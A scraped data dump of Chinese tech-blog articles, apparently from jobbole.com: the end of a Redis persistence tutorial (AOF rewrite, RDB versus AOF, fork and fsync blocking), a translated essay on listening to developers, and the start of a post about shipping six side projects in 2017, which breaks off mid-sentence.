由于fork操作使用写时复制技术，子进程只能共享fork操作时的内存数据。<strong>由于父进程依然在响应命令，因此Redis使用AOF重写缓冲区(图中的aof_rewrite_buf)保存这部分数据，防止新AOF文件生成期间丢失这部分数据。也就是说，bgrewriteaof执行期间，Redis的写命令同时追加到aof_buf和aof_rewirte_buf两个缓冲区。</strong></p>\n<p>4) 子进程根据内存快照，按照命令合并规则写入到新的AOF文件。</p>\n<p>5.1) 子进程写完新的AOF文件后，向父进程发信号，父进程更新统计信息，具体可以通过info persistence查看。</p>\n<p>5.2) 父进程把AOF重写缓冲区的数据写入到新的AOF文件，这样就保证了新AOF文件所保存的数据库状态和服务器当前状态一致。</p>\n<p>5.3) 使用新的AOF文件替换老文件，完成AOF重写。</p>\n<h2>3. 启动时加载</h2>\n<p>前面提到过，当AOF开启时，Redis启动时会优先载入AOF文件来恢复数据；只有当AOF关闭时，才会载入RDB文件恢复数据。</p>\n<p>当AOF开启，且AOF文件存在时，Redis启动日志：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/d49381c9c2e7613607d5ea44f4e01e8a.png\" alt=\"\"></p>\n<p>当AOF开启，但AOF文件不存在时，即使RDB文件存在也不会加载(更早的一些版本可能会加载，但3.0不会)，Redis启动日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/6bc3128e30e32da4892e6838adbcab3c.png\" alt=\"\"></p>\n<p><strong>文件校验</strong></p>\n<p>与载入RDB文件类似，Redis载入AOF文件时，会对AOF文件进行校验，如果文件损坏，则日志中会打印错误，Redis启动失败。但如果是AOF文件结尾不完整(机器突然宕机等容易导致文件尾部不完整)，且aof-load-truncated参数开启，则日志中会输出警告，Redis忽略掉AOF文件的尾部，启动成功。aof-load-truncated参数默认是开启的：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1355e2b884fc0fd4dd40a6aba7dad6da.png\" alt=\"\"></p>\n<p><strong>伪客户端</strong></p>\n<p>因为Redis的命令只能在客户端上下文中执行，而载入AOF文件时命令是直接从文件中读取的，并不是由客户端发送；因此Redis服务器在载入AOF文件之前，会创建一个没有网络连接的客户端，之后用它来执行AOF文件中的命令，命令执行的效果与带网络连接的客户端完全一样。</p>\n<h2>4. AOF常用配置总结</h2>\n<p>下面是AOF常用的配置项，以及默认值；前面介绍过的这里不再详细介绍。</p>\n<ul>\n<li>appendonly no：是否开启AOF</li>\n<li>appendfilename “appendonly.aof”：AOF文件名</li>\n<li>dir ./：RDB文件和AOF文件所在目录</li>\n<li>appendfsync everysec：fsync持久化策略</li>\n<li>no-appendfsync-on-rewrite no：AOF重写期间是否禁止fsync；如果开启该选项，可以减轻文件重写时CPU和硬盘的负载（尤其是硬盘），但是可能会丢失AOF重写期间的数据；需要在负载和安全性之间进行平衡</li>\n<li>auto-aof-rewrite-percentage 100：文件重写触发条件之一</li>\n<li>auto-aof-rewrite-min-size 64mb：文件重写触发提交之一</li>\n<li>aof-load-truncated yes：如果AOF文件结尾损坏，Redis启动时是否仍载入AOF文件</li>\n</ul>\n<h1>五、方案选择与常见问题</h1>\n<p>前面介绍了RDB和AOF两种持久化方案的细节，下面介绍RDB和AOF的特点、如何选择持久化方案，以及在持久化过程中常遇到的问题等。</p>\n<h2>1. RDB和AOF的优缺点</h2>\n<p>RDB和AOF各有优缺点：</p>\n<p><strong>RDB持久化</strong></p>\n<p>优点：RDB文件紧凑，体积小，网络传输快，适合全量复制；恢复速度比AOF快很多。当然，与AOF相比，RDB最重要的优点之一是对性能的影响相对较小。</p>\n<p>缺点：RDB文件的致命缺点在于其数据快照的持久化方式决定了必然做不到实时持久化，而在数据越来越重要的今天，数据的大量丢失很多时候是无法接受的，因此AOF持久化成为主流。此外，RDB文件需要满足特定格式，兼容性差（如老版本的Redis不兼容新版本的RDB文件）。</p>\n<p><strong>AOF持久化</strong></p>\n<p>与RDB持久化相对应，AOF的优点在于支持秒级持久化、兼容性好，缺点是文件大、恢复速度慢、对性能影响大。</p>\n<h2>2. 持久化策略选择</h2>\n<p>在介绍持久化策略之前，首先要明白无论是RDB还是AOF，持久化的开启都是要付出性能方面代价的：对于RDB持久化，一方面是bgsave在进行fork操作时Redis主进程会阻塞，另一方面，子进程向硬盘写数据也会带来IO压力；对于AOF持久化，向硬盘写数据的频率大大提高(everysec策略下为秒级)，IO压力更大，甚至可能造成AOF追加阻塞问题（后面会详细介绍这种阻塞），此外，AOF文件的重写与RDB的bgsave类似，会有fork时的阻塞和子进程的IO压力问题。相对来说，由于AOF向硬盘中写数据的频率更高，因此对Redis主进程性能的影响会更大。</p>\n<p>在实际生产环境中，根据数据量、应用对数据的安全要求、预算限制等不同情况，会有各种各样的持久化策略；如完全不使用任何持久化、使用RDB或AOF的一种，或同时开启RDB和AOF持久化等。此外，持久化的选择必须与Redis的主从策略一起考虑，因为主从复制与持久化同样具有数据备份的功能，而且主机master和从机slave可以独立的选择持久化方案。</p>\n<p>下面分场景来讨论持久化策略的选择，下面的讨论也只是作为参考，实际方案可能更复杂更具多样性。</p>\n<p>（1）如果Redis中的数据完全丢弃也没有关系（如Redis完全用作DB层数据的cache），那么无论是单机，还是主从架构，都可以不进行任何持久化。</p>\n<p>（2）在单机环境下（对于个人开发者，这种情况可能比较常见），如果可以接受十几分钟或更多的数据丢失，选择RDB对Redis的性能更加有利；如果只能接受秒级别的数据丢失，应该选择AOF。</p>\n<p>（3）但在多数情况下，我们都会配置主从环境，slave的存在既可以实现数据的热备，也可以进行读写分离分担Redis读请求，以及在master宕掉后继续提供服务。</p>\n<p>在这种情况下，一种可行的做法是：</p>\n<p>master：完全关闭持久化（包括RDB和AOF），这样可以让master的性能达到最好</p>\n<p>slave：关闭RDB，开启AOF（如果对数据安全要求不高，开启RDB关闭AOF也可以），并定时对持久化文件进行备份（如备份到其他文件夹，并标记好备份的时间）；然后关闭AOF的自动重写，然后添加定时任务，在每天Redis闲时（如凌晨12点）调用bgrewriteaof。</p>\n<p>这里需要解释一下，为什么开启了主从复制，可以实现数据的热备份，还需要设置持久化呢？因为在一些特殊情况下，主从复制仍然不足以保证数据的安全，例如：</p>\n<ul>\n<li>master和slave进程同时停止：考虑这样一种场景，如果master和slave在同一栋大楼或同一个机房，则一次停电事故就可能导致master和slave机器同时关机，Redis进程停止；如果没有持久化，则面临的是数据的完全丢失。</li>\n<li>master误重启：考虑这样一种场景，master服务因为故障宕掉了，如果系统中有自动拉起机制（即检测到服务停止后重启该服务）将master自动重启，由于没有持久化文件，那么master重启后数据是空的，slave同步数据也变成了空的；如果master和slave都没有持久化，同样会面临数据的完全丢失。需要注意的是，即便是使用了哨兵(关于哨兵后面会有文章介绍)进行自动的主从切换，也有可能在哨兵轮询到master之前，便被自动拉起机制重启了。因此，应尽量避免“自动拉起机制”和“不做持久化”同时出现。</li>\n</ul>\n<p>（4）异地灾备：上述讨论的几种持久化策略，针对的都是一般的系统故障，如进程异常退出、宕机、断电等，这些故障不会损坏硬盘。但是对于一些可能导致硬盘损坏的灾难情况，如火灾地震，就需要进行异地灾备。例如对于单机的情形，可以定时将RDB文件或重写后的AOF文件，通过scp拷贝到远程机器，如阿里云、AWS等；对于主从的情形，可以定时在master上执行bgsave，然后将RDB文件拷贝到远程机器，或者在slave上执行bgrewriteaof重写AOF文件后，将AOF文件拷贝到远程机器上。一般来说，由于RDB文件文件小、恢复快，因此灾难恢复常用RDB文件；异地备份的频率根据数据安全性的需要及其他条件来确定，但最好不要低于一天一次。</p>\n<h2>3. fork阻塞：CPU的阻塞</h2>\n<p>在Redis的实践中，众多因素限制了Redis单机的内存不能过大，例如：</p>\n<ul>\n<li>当面对请求的暴增，需要从库扩容时，Redis内存过大会导致扩容时间太长；</li>\n<li>当主机宕机时，切换主机后需要挂载从库，Redis内存过大导致挂载速度过慢；</li>\n<li>以及持久化过程中的fork操作，下面详细说明。</li>\n</ul>\n<p>首先说明一下fork操作：</p>\n<p>父进程通过fork操作可以创建子进程；子进程创建后，父子进程共享代码段，不共享进程的数据空间，但是子进程会获得父进程的数据空间的副本。在操作系统fork的实际实现中，基本都采用了写时复制技术，即在父/子进程试图修改数据空间之前，父子进程实际上共享数据空间；但是当父/子进程的任何一个试图修改数据空间时，操作系统会为修改的那一部分(内存的一页)制作一个副本。</p>\n<p>虽然fork时，子进程不会复制父进程的数据空间，但是会复制内存页表（页表相当于内存的索引、目录）；父进程的数据空间越大，内存页表越大，fork时复制耗时也会越多。</p>\n<p>在Redis中，无论是RDB持久化的bgsave，还是AOF重写的bgrewriteaof，都需要fork出子进程来进行操作。如果Redis内存过大，会导致fork操作时复制内存页表耗时过多；而Redis主进程在进行fork时，是完全阻塞的，也就意味着无法响应客户端的请求，会造成请求延迟过大。</p>\n<p>对于不同的硬件、不同的操作系统，fork操作的耗时会有所差别，一般来说，如果Redis单机内存达到了10GB，fork时耗时可能会达到百毫秒级别（如果使用Xen虚拟机，这个耗时可能达到秒级别）。因此，一般来说Redis单机内存一般要限制在10GB以内；不过这个数据并不是绝对的，可以通过观察线上环境fork的耗时来进行调整。观察的方法如下：执行命令info stats，查看latest_fork_usec的值，单位为微秒。</p>\n<p>为了减轻fork操作带来的阻塞问题，除了控制Redis单机内存的大小以外，还可以适度放宽AOF重写的触发条件、选用物理机或高效支持fork操作的虚拟化技术等，例如使用Vmware或KVM虚拟机，不要使用Xen虚拟机。</p>\n<h2>4. AOF追加阻塞：硬盘的阻塞</h2>\n<p>前面提到过，在AOF中，如果AOF缓冲区的文件同步策略为everysec，则：在主线程中，命令写入aof_buf后调用系统write操作，write完成后主线程返回；fsync同步文件操作由专门的文件同步线程每秒调用一次。</p>\n<p>这种做法的问题在于，如果硬盘负载过高，那么fsync操作可能会超过1s；如果Redis主线程持续高速向aof_buf写入命令，硬盘的负载可能会越来越大，IO资源消耗更快；如果此时Redis进程异常退出，丢失的数据也会越来越多，可能远超过1s。</p>\n<p>为此，Redis的处理策略是这样的：主线程每次进行AOF会对比上次fsync成功的时间；如果距上次不到2s，主线程直接返回；如果超过2s，则主线程阻塞直到fsync同步完成。因此，如果系统硬盘负载过大导致fsync速度太慢，会导致Redis主线程的阻塞；此外，使用everysec配置，AOF最多可能丢失2s的数据，而不是1s。</p>\n<p>AOF追加阻塞问题定位的方法：</p>\n<p>（1）监控info Persistence中的aof_delayed_fsync：当AOF追加阻塞发生时（即主线程等待fsync而阻塞），该指标累加。</p>\n<p>（2）AOF阻塞时的Redis日志：</p>\n<p>Asynchronous AOF fsync is taking too long (disk is busy?). Writing the AOF buffer without waiting for fsync to complete, this may slow down Redis.</p>\n<p>（3）如果AOF追加阻塞频繁发生，说明系统的硬盘负载太大；可以考虑更换IO速度更快的硬盘，或者通过IO监控分析工具对系统的IO负载进行分析，如iostat（系统级io）、iotop（io版的top）、pidstat等。</p>\n<h2><a name=\"t55\"></a>5. info命令与持久化</h2>\n<p>前面提到了一些通过info命令查看持久化相关状态的方法，下面来总结一下。</p>\n<p>（1）info Persistence</p>\n<p>执行结果如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/f238e2d52950ad685901cade59bf8809.png\" alt=\"\"></p>\n<p>其中比较重要的包括：</p>\n<ul>\n<li>rdb_last_bgsave_status:上次bgsave 执行结果，可以用于发现bgsave错误</li>\n<li>rdb_last_bgsave_time_sec:上次bgsave执行时间（单位是s），可以用于发现bgsave是否耗时过长</li>\n<li>aof_enabled:AOF是否开启</li>\n<li>aof_last_rewrite_time_sec: 上次文件重写执行时间（单位是s），可以用于发现文件重写是否耗时过长</li>\n<li>aof_last_bgrewrite_status: 上次bgrewrite执行结果，可以用于发现bgrewrite错误</li>\n<li>aof_buffer_length和aof_rewrite_buffer_length:aof缓存区大小和aof重写缓冲区大小</li>\n<li>aof_delayed_fsync:AOF追加阻塞情况的统计</li>\n</ul>\n<p>（2）info stats</p>\n<p>其中与持久化关系较大的是：latest_fork_usec，代表上次fork耗时，可以参见前面的讨论。</p>\n<h1>六、总结</h1>\n<p>本文主要内容可以总结如下：</p>\n<p>1、持久化在Redis高可用中的作用：数据备份，与主从复制相比强调的是由内存到硬盘的备份。</p>\n<p>2、RDB持久化：将数据快照备份到硬盘；介绍了其触发条件（包括手动出发和自动触发）、执行流程、RDB文件等，特别需要注意的是文件保存操作由fork出的子进程来进行。</p>\n<p>3、AOF持久化：将执行的写命令备份到硬盘（类似于MySQL的binlog），介绍了其开启方法、执行流程等，特别需要注意的是文件同步策略的选择（everysec）、文件重写的流程。</p>\n<p>4、一些现实的问题：包括如何选择持久化策略，以及需要注意的fork阻塞、AOF追加阻塞等。</p>\n<h1>参考文献</h1>\n<p>《Redis开发与运维》</p>\n<p>《Redis设计与实现》</p>\n<p>《Redis实战》</p>\n<p><a href=\"http://www.redis.cn/topics/persistence.html\">http://www.redis.cn/topics/persistence.html</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/fpupqLp-wjR8fQvYSQhVLg\">https://mp.weixin.qq.com/s/fpupqLp-wjR8fQvYSQhVLg</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzI4NTA1MDEwNg==&amp;mid=2650764050&amp;idx=1&amp;sn=891287b9f99a8c1dd4ce9e1805646741&amp;chksm=f3f9c687c48e4f91c6631e7f5e36a9169c10549386bec541dbeef92ed0023a373f6ec25c2ef1&amp;mpshare=1&amp;scene=1&amp;srcid=0525xnHQxiFwpzFWSME2LQrb#rd\">https://mp.weixin.qq.com/s?__biz=MzI4NTA1MDEwNg==&amp;mid=2650764050&amp;idx=1&amp;sn=891287b9f99a8c1dd4ce9e1805646741&amp;chksm=f3f9c687c48e4f91c6631e7f5e36a9169c10549386bec541dbeef92ed0023a373f6ec25c2ef1&amp;mpshare=1&amp;scene=1&amp;srcid=0525xnHQxiFwpzFWSME2LQrb#rd</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzI4NTA1MDEwNg==&amp;mid=2650763383&amp;idx=1&amp;sn=348a84605a7cdefe4e075c9f0310f257&amp;chksm=f3f9c5e2c48e4cf41bd3f708bce3f9a1302a699cf7defe611e9aea120fcb424944119e079362&amp;mpshare=1&amp;scene=1&amp;srcid=0525XIl8KXvHYvX42oaUcop0#rd\">https://mp.weixin.qq.com/s?__biz=MzI4NTA1MDEwNg==&amp;mid=2650763383&amp;idx=1&amp;sn=348a84605a7cdefe4e075c9f0310f257&amp;chksm=f3f9c5e2c48e4cf41bd3f708bce3f9a1302a699cf7defe611e9aea120fcb424944119e079362&amp;mpshare=1&amp;scene=1&amp;srcid=0525XIl8KXvHYvX42oaUcop0#rd</a></p>\n<p><a href=\"https://blog.csdn.net/tonyxf121/article/details/8475603\">https://blog.csdn.net/tonyxf121/article/details/8475603</a></p>\n<p><a href=\"http://heylinux.com/archives/1932.html\">http://heylinux.com/archives/1932.html</a></p>\n<p><a href=\"https://www.m690.com/archives/380/\">https://www.m690.com/archives/380/</a></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114093\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114093votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114093\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Redis,数据库", "url": "http://blog.jobbole.com/114093/", "url_obj_id": "e4cc420154439ecffbc963653c5f7cd8"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/98df4795d7c7f65c7ec89ddf1a1afd92.jpg"], "title": "倾听程序员的心声真的很重要", "create_date": "2018/06/05 ·", "praise_num": 1, "fav_num": 2, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://dzone.com/articles/the-importance-of-listening-to-developers\">Miranda Casey</a>   译文出处：<a target=\"_blank\" href=\"http://www.codeceo.com/\">码农网 – 小峰</a>   </div><div id=\"news_body\">\n<p>说到开发产品，没有人比程序员更了解产品。程序员知道产品的优点、缺陷、用途和潜在用途。说起这些，程序员了如指掌，如数家珍。</p>\n<p>在这个似乎无所不在的数字时代，倾听程序员必须要说的内容非常重要，而且也许比以往任何时期都更加重要。</p>\n<p><img class=\"aligncenter\" title=\"listening-programmer\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/679dcea4d5a241ddf52d658c3132e98e.jpg\" alt=\"\" width=\"660\" height=\"430\"></p>\n<p>计算机和网络行业日渐变得更加软件驱动。同时，物联网（IoT）产业正在迅速占领市场。Gartner 预测，到 2020 年，全球将有超过 208 亿个连接的物联网设备。从汽车到衣服到尚未可知的产品，我们将开发出数以亿计的物联网设备——从设备到收集并向最终用户显示数据的项目或 app 都需要编程。竞争将不可避免地出现在该领域的许多新老对手中。</p>\n<p>在像 IoT 这样的新兴行业中，开发者社区至关重要。那些具备了软件和工程技能的人员必须能够开发、探索并将创意引导到现实中，将现有产品开发并优化为更好的产品。在此过程中，开发人员的知识和投入非常重要。</p>\n<p>任何行业，无论是否是新兴行业，你都不能冒疏远开发者的风险。忽视他们的投入意味着对他们缺乏信任，而信任是管理者与开发者关系良好的基石。他们需要信任你的产品以及你告诉他们的有关你的产品的要点。</p>\n<p>你最不应该做的一件事是危及到维护和开发产品的知识库。你还需要保持开发人员的投入并对你要求他们做的事情感兴趣。你需要听取他们的意见。</p>\n<p>为此，你需要一个在线社区。社区促进倾听。良好的社区使开发人员可以轻松地与其他开发人员进行协作和合作，并且在征求和收集开发人员投入的过程中提供所急需的手续。请记住，收集反馈信息越容易，将信息提供给产品管理和工程团队的速度就越快。</p>\n<h1>改进开发体验</h1>\n<p>良好的社区不仅承认开发人员对产品和平台的贡献，而且还不断寻求改进开发人员体验的方法。改进过程不应该凭空进行；此过程应该由开发者自己来提供意见。</p>\n<p>例如，社区经理发布了一个简短的调查，询问开发人员开发特定平台的近期体验。这项调查不仅是为了听取开发者喜欢什么，而且还想知道他们不喜欢什么，什么让他们感到沮丧，他们希望能以怎样不同的方式改善体验。经理跟进几项调查回复，深入挖掘开发人员的关注点。</p>\n<p>然后，经理处理这些问题，在开发人员社区中进行以下改进：</p>\n<ul>\n<li>重新整理开发人员文档体系结构，以简化导航并更容易找到最流行的参考文档</li>\n<li>增加示例代码数量</li>\n<li>实施流程以确保 SDK 与最新的产品更新和 bug 修复同步</li>\n</ul>\n<p>社区改进的范围很广，并且没有一成不变的规则或准则。最主要的是让开发者有机会表达他们的好恶，并确保他们的努力不会被置之不理。</p>\n<h1>这是你不能忽略的声音</h1>\n<p>开发人员的投入有助于确保你的产品满足客户的期望并解决他们的问题。开发者提出的意见可帮助你提供令人惊叹的客户体验，并提高客户粘性。开发者付出的努力是产品可靠性和寿命最宝贵的资源之一。</p>\n<p>你需要倾听开发人员的意见，并为他们提供一个社区，不但开发者可以在社区中贡献和协作，而且你也可以在社区里轻松地征求、收集和积极影响开发者的重要投入。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114075\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114075votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114075\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,心声", "url": "http://blog.jobbole.com/114075/", "url_obj_id": "0581f8b22054b8c37da7ce4b62c1348d"}
{"front_img_url": ["http://wx1.sinaimg.cn/large/63918611gy1frenpxw9krj20rs0j6q9i.jpg"], "title": "2017 年，我发布了 6 个副项目", "create_date": "2018/06/08 ·", "praise_num": 1, "fav_num": 2, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/chenyahui\">精算狗</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://hackernoon.com/how-i-shipped-six-side-projects-in-2017-3dde6c77adbb\">Mark Johnson</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>2016 年我曾定了一个目标——每个月都要学点新东西。最终，我发布了 6 个新项目。下面我要对这些项目以及我学到的东西做个总结。</p>\n<p>回望这一年，我成功发布了尽可能多的副项目，同时有一份超过了全职工作的工作、和家人度过了高质量的时光（我有两个孩子和一位非常有耐心的妻子）、作为兼职教授教书、还兼职提供咨询服务。这些对我来说似乎有点疯狂。</p>\n<p>人们容易把缺乏时间视为阻碍自己做副项目的原因。我们常给自己找的借口是“只要有更多时间……”。我们还寻找花里胡哨的 App 或者任务管理技巧，来尝试在时间表中空出些时间来。</p>\n<p>但是，去年我学到的主要的一点就是，<strong><em><span style=\"color: #ff0000;\">时间不是首要问题。你有足够的时间；你需要的是动力。</span></em></strong></p>\n<p>好消息是，我们“应付得了”动力。在 2017 年我学到了几种应付动力的方法，我想跟你们分享一下。</p>\n<h3>你必须得选一个你真正感兴趣的想法</h3>\n<p>你只是不能对你不关心的事物保持热情，所以选一些你激情所在的事情来做。当你灵光一闪时，别让它溜走，用上它。即使这意味着你要在工作会议上草草记下些笔记。</p>\n<p>重要的是紧紧抓住这些灵感时刻，以求知若饥并保持对工作的好奇心。</p>\n<h3>给自己准备一个工作时间表</h3>\n<p>对我来说，这意味着每个月发布些东西。一旦我开始工作，我往往会搞砸。所以 30 天的限制确实能帮助我控制好这个趋势，有效利用我的动力。</p>\n<p>如果结果发现某个月的想法不中用，这也能给你一个机会去尝试新想法。至少你不会把一整年的时间浪费在它上面。</p>\n<h3>你需要一个分享成果的公开截止日期</h3>\n<p>这是重要的一点。在项目尾声时你会耗尽“动力库”。（最后 10% 是致命的。）唯一能助你度过动力低迷期的是，知道在另一头还有人等着看你的成果。</p>\n<p>分享工作成果的另一个好处是，给你一个为副项目收集支持性反馈的机会。我工作的地方 <a href=\"https://atlaslocal.com\">Atlas Local</a> 会在每月第一个周五举办全办公室范围的活动。我利用这项活动展示我前一个月的项目，而且总能收到在场的这些慷慨的伙伴的鼓励和支持。</p>\n<p>站出来分享你的成果，你会对你收到了多少支持而感到震惊的。</p>\n<p style=\"text-align: center;\">. . .</p>\n<p>这项实验中最让我惊讶的部分大概就是，我对在 2018 年发布更多工作更加充满动力，远不是在最后筋疲力尽。</p>\n<p>我会鼓励你在新的一年里应付动力问题，并发布一些你已经考虑了一段时间的想法。如果你尝试了，那我很乐意洗耳恭听。</p>\n<p>如果你对我在 2017 年的工作成果的细节感兴趣，请继续阅读！</p>\n<p style=\"text-align: center;\">. . .</p>\n<h2>一月项目：<a href=\"https://www.pers0nal1ty.com\">Pers0nal1ty.com </a></h2>\n<p><em>可视化比较团队最强特点和最弱特点的个性类型</em></p>\n<p><img src=\"http://wx1.sinaimg.cn/large/63918611gy1frenpxw9krj20rs0j6q9i.jpg\"></p>\n<p>我已经入<strong>迈尔斯·布里格斯类型指标（MBTI）</strong> 的坑一段时间了。尽管我不把它看成是规范，也不认为它有那么科学，它仍是一个理解与我不同的人的有用框架。</p>\n<p>很多痴迷于个性的人没有意识到的是，MBTI 系统是基于<em>认知功能</em>的。认知功能是由现代心理学之父 Carl Jung 在上世纪 20 年代创造的。我想深挖一下，并进一步学习它。</p>\n<p>同时，我看了 HBO 的《西部世界》，看到了下面这一幕：</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/63918611gy1frenpygjl1j20m80ci763.jpg\"></p>\n<p>我超爱这类科幻用户界面，它马上吸引了我的注意力。我想，如果我能基于人们的 MBTI 特征，建他们各自的“角色档案”会怎么样呢？为什么不呢？</p>\n<p>为了该项目做准备，我读了 “MBTI 圣经”， <a href=\"https://www.amazon.com/Gifts-Differing-Understanding-Personality-Type/dp/089106074X\">Myers 和 Briggs 合著的《Gifts Differing</a>》，并着手构建一个系统，该系统可以根据 MBTI 系统的基础——<a href=\"https://en.wikipedia.org/wiki/Jungian_cognitive_functions\">认知功能</a>来生成雷达图。</p>\n<p>最后，我以《西部世界》的用户界面为核心，因为我（和其他 beta 测试者）发现，将多人重叠在同一张雷达图上以获得一群人之间的关系的能力更为实用。</p>\n<p>如果我自己也这么说的话，结果确实很有趣。试试输入团队成员的个性类型或者你和你伴侣的个性类型：</p>\n<p> </p>\n<h3>二月：<a href=\"https://sheetcake.cc\">Sheetcake 登录页面</a></h3>\n<p><em>制作任何网上登陆表单最简单的方法</em></p>\n<p style=\"text-align: center;\"><img src=\"http://wx2.sinaimg.cn/mw690/63918611gy1frenpzfh23j20rs0k5tio.jpg\"></p>\n<p style=\"text-align: center;\">Sheetcake 登陆页面</p>\n<p>我已经着手于 Sheetcake 几年了。它拥有非常小的一部分忠实用户（他们中的大多数都认识我或者与我关系亲密的人）。</p>\n<p>SheetCake 趣事：</p>\n<ul>\n<li>2012 年，我在 48 小时内完成了第一个版本。这是年轻一点的我演示这个 48 小时版本的<a href=\"https://www.youtube.com/watch?v=L5jsxlQr37Q\">视频</a></li>\n<li>我已经重新写了 4 次！第一版是用了 Backbone.js + Node.js。第二版是用了 Backbone + Marionette + Firebase。第三版是用了 React + Firebase（全都用了 CoffeeScript）。第四版，也是最终版，是用了 ES6、React 和 Firebase。</li>\n<li>使用 Sheetcake 的人往往连着用了好几年；然而还没有商业模型。</li>\n</ul>\n<p>Sheetcake 在某几方面的确做得很好（比如 Zero Day 注册），所以我想为它制作一个登录页面，以推销这些优点。我从一个模版开始，这是它的最终版本。</p>\n<p> </p>\n<h3>三月：<a href=\"https://www.wmdmark.com\">NeTi 聊天机器人</a></h3>\n<p><em>向我外向的机器人助手提有关于我的问题</em></p>\n<p style=\"text-align: center;\"><img src=\"http://wx3.sinaimg.cn/mw690/63918611gy1frenq0ed6aj20rs0gsab3.jpg\"></p>\n<p style=\"text-align: center;\">NeTi 聊天机器人</p>\n<p>去年早些时候，聊天机器人大火。尽管我从来不对聊天机器人能自己去某地抱什么希望，但是它们的对话 A.I. 属性还是吸引了我，我想进一步了解它。</p>\n<p>我是个内向的人，一般十分不擅长分享自己的事情。所以我想创造一个外向的机器人，它可以回答一些关于我的简单问题，这可能很有趣。</p>\n<ul>\n<li>如果我是个外向的人，我会拥有某些认知功能，NeTi 就得名于此。</li>\n<li>给提问意图分类的 A.I. 部分是用 Wit.ai 构建的，Wit.ai 使得构建 A.I. 容易多了。</li>\n<li>别让 NeTi 太生气，否则它可能会猛烈抨击你。</li>\n</ul>\n<p> </p>\n<h3>四月：<a href=\"https://github.com/wmdmark/goap-js\">G.O.A.P.</a></h3>\n<p><em>用目标导向型行动计划（Goal Oriented Action Planning ）构建令人信服的 A.I.</em></p>\n<p style=\"text-align: center;\"><img src=\"http://wx2.sinaimg.cn/mw690/63918611gy1frenq0zcdmj20rs0kun8x.jpg\"></p>\n<p style=\"text-align: center;\">添加了移轴效果的代码截图——为什么不呢？</p>\n<p>在偶然间看到<a href=\"http://alumni.media.mit.edu/~jorkin/goap.html\">这篇文章</a>后，我被一个游戏背景中描述的 <a href=\"http://alumni.media.mit.edu/~jorkin/goap.html\">GOAP</a> 深深吸引。这个游戏叫 <a href=\"https://en.wikipedia.org/wiki/F.E.A.R.\">F.E.A.R</a>，对我来说有些怀旧气息。</p>\n<p>过去我参与过一些有基础 A.I. 的游戏的工作，从来没有遇到这项技术。我记得那时我觉得 F.E.A.R 的 A.I. 特别令人印象深刻、栩栩如生。</p>\n<p>在进一步研究后，这个方法最吸引人的地方不是结果多么令人信服，而是解决方法多简单优雅（尤其是跟更标准的 A.I. 方法比较，比如有限状态机（Finite State 